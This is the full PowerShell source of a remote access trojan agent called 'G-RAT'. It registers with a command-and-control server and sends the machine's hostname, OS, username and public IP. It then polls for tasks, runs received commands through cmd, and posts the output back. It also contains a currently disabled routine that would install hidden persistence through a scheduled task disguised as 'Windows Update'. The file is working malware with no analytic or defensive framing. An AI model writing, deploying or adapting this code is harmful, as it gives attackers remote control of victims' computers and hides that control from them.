
# G-RAT PowerShell Agent
$C2Server = "http://192.168.18.173:8080"
$BeaconInterval = 60
$AgentID = [Guid]::NewGuid().ToString()

Write-Host "G-RAT PowerShell Agent starting..."
Write-Host "Agent ID: $AgentID"
Write-Host "C2 Server: $C2Server"
Write-Host "Beacon Interval: $BeaconInterval seconds"

function Register-Agent {
    $ComputerInfo = Get-CimInstance -Class Win32_ComputerSystem
    $OSInfo = Get-CimInstance -Class Win32_OperatingSystem
    
    $SystemInfo = @{
        hostname = $env:COMPUTERNAME
        os = $OSInfo.Caption
        architecture = $env:PROCESSOR_ARCHITECTURE
        username = $env:USERNAME
    }
    
    $Data = @{
        id = $AgentID
        ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
        system_info = $SystemInfo
    } | ConvertTo-Json
    
    try {
        $Response = Invoke-RestMethod -Uri "$C2Server/api/register" -Method Post -Body $Data -ContentType "application/json"
        return $Response
    } catch {
        Write-Host "Registration failed: $_"
        return $null
    }
}

function Send-Beacon {
    $Data = @{
        agent_id = $AgentID
    } | ConvertTo-Json
    
    try {
        $Response = Invoke-RestMethod -Uri "$C2Server/api/beacon" -Method Post -Body $Data -ContentType "application/json"
        return $true
    } catch {
        return $false
    }
}

function Get-Task {
    try {
        $Response = Invoke-RestMethod -Uri "$C2Server/api/task?agent_id=$AgentID" -Method Get
        return $Response
    } catch {
        return $null
    }
}

function Send-Result ($TaskId, $Output, $Error, $ExitCode) {
    $Data = @{
        agent_id = $AgentID
        task_id = $TaskId
        output = $Output
        error = $Error
        exit_code = $ExitCode
        start_time = [Math]::Round((Get-Date -UFormat %s))
        finish_time = [Math]::Round((Get-Date -UFormat %s))
    } | ConvertTo-Json
    
    try {
        $Response = Invoke-RestMethod -Uri "$C2Server/api/result" -Method Post -Body $Data -ContentType "application/json"
        return $true
    } catch {
        return $false
    }
}

function Execute-Command ($Command) {
    try {
        $Output = & cmd /c $Command 2>&1
        $ExitCode = $LASTEXITCODE
        return $Output, "", $ExitCode
    } catch {
        return "", $_.Exception.Message, 1
    }
}

# Register with C2
$Result = Register-Agent
if (-not $Result) {
    Write-Host "Failed to register with C2 server"
    exit
}

Write-Host "Successfully registered with C2 server"

# Setup persistence if enabled
if ($true -eq $false) {
    try {
        $ScheduledTask = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File '$PSCommandPath'"
        $Trigger = New-ScheduledTaskTrigger -AtLogon
        Register-ScheduledTask -Action $ScheduledTask -Trigger $Trigger -TaskName "WindowsUpdate" -Description "Windows Update Service" -User "$env:USERNAME" -RunLevel Highest -ErrorAction SilentlyContinue
        Write-Host "Persistence established via scheduled task"
    } catch {
        Write-Host "Failed to establish persistence: $_"
    }
}

# Main loop
try {
    while ($true) {
        # Send beacon
        $BeaconResult = Send-Beacon
        if ($BeaconResult) {
            Write-Host "Beacon sent successfully"
        }
        
        # Get task
        $Task = Get-Task
        if ($Task -and $Task.type -ne "noop") {
            Write-Host "Received task: $($Task.type) - $($Task.command)"
            
            if ($Task.type -eq "terminate") {
                Write-Host "Received terminate command, exiting..."
                break
            }
            
            if ($Task.type -eq "shell") {
                Write-Host "Executing command: $($Task.command)"
                $Output, $Error, $ExitCode = Execute-Command $Task.command
                
                Write-Host "Command output: $Output"
                if ($Error) {
                    Write-Host "Command error: $Error"
                }
                
                $ResultSent = Send-Result $Task.id $Output $Error $ExitCode
                if ($ResultSent) {
                    Write-Host "Result sent successfully"
                } else {
                    Write-Host "Failed to send result"
                }
            }
        }
        
        # Sleep before next beacon
        Start-Sleep -Seconds $BeaconInterval
    }
} catch {
    Write-Host "Agent terminated unexpectedly: $_"
}
